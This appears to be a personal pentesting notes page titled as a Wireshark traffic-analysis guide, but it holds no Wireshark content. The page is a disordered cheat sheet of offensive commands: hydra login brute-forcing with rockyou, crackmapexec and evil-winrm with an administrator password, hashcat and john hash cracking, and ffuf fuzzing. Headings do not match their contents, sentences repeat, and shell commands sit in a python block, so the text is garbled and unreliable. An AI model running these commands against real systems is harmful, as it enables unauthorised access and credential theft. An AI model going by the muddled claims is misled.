---
TitleSEO: "Network Traffic Analysis with Wireshark | ZureFX"
TitlePost: "Network Traffic Analysis with Wireshark"
Author: "ZureFX"
Description: "Personal notes on Network Traffic Analysis with Wireshark. Quick reference for pentesting and CTF challenges."
Keywords: "lateral movement, cheatsheet, blue team, windows, oscp"
URL: "https://zurefx.github.io/notes/note-network-traffic-analysis-with-wireshark-326.html"
URL_IMAGES: ""
Date: "2025-09-08"
Tags: "Lateral Movement, Cheatsheet, Blue Team, Windows, OSCP"
Section: "notes"
Lang: "en"
main_img: "note-network-traffic-analysis-with-wireshark-326"
Permalink: "/notes/note-network-traffic-analysis-with-wireshark-326.html"
BtnLabel: "Read Notes"
Pick: 0
---
## pwncat

### AS-REP Roasting

- `GetUserSPNs`
- `SeDebugPrivilege`
- `DNS Rebinding`
- `impacket`
- `sqlmap`
- `Open Redirect`

Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target.

## sharphound

### Remote Code Execution

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.59.85.133 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
crackmapexec smb 10.42.237.7 -u administrator -p 'P@ssw0rd!' --shares
```

> **Note:** Remote Code Execution was identified as the primary attack vector in this scenario.

## SSRF

### Telnet

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible. Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.19.101.173/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.106.70.204 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Unconstrained Delegation

### NFS No Root Squash

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.106.110.93/FUZZ
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

```python
evil-winrm -i 10.60.78.112 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.103.9.34 -u administrator -p 'P@ssw0rd!' --shares
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI). Group Policy Preferences contained encrypted but recoverable credentials. The service was running without proper input validation, leading to injection vulnerabilities.
